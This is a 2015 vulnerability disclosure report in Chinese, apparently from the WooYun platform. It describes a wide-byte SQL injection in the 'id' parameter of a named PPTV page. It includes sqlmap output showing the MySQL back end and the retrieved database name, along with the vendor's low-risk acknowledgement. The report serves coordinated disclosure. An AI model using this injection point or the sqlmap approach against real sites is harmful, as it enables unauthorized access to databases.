wybug_detail:
漏洞详情 披露状态：   									2015-08-24：	细节已通知厂商并且等待厂商处理中									2015-08-25：	厂商已经确认，细节仅向厂商公开									2015-09-04：	细节向核心白帽子及相关领域专家公开									2015-09-14：	细节向普通白帽子公开									2015-09-24：	细节向实习白帽子公开									2015-10-09：	细节向公众公开  简要描述： PPTV某处宽字节注入 详细说明：  http://creative.pptv.com/share/detail?id=49注入点 id

   漏洞证明：  
---[11:54:41] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5[11:54:41] [INFO] fetching database names[11:54:41] [INFO] fetching number of databases[11:54:41] [WARNING] time-based comparison requires larger statistical model, please wait..............................    [11:54:44] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors [11:54:44] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[11:54:44] [ERROR] unable to retrieve the number of databases[11:54:44] [INFO] falling back to current database[11:54:44] [INFO] fetching current database[11:54:44] [INFO] retrieved: do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[11:55:00] [INFO] adjusting time delay to 1 second due to good response timespp_zoneavailable databases [1]:[*] pp_zone

wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-08-25 10:27 厂商回复： 注入点存在，但注入效果实际危害不大。已经敦促研发修复中。谢谢哦~~ 最新状态： 暂无
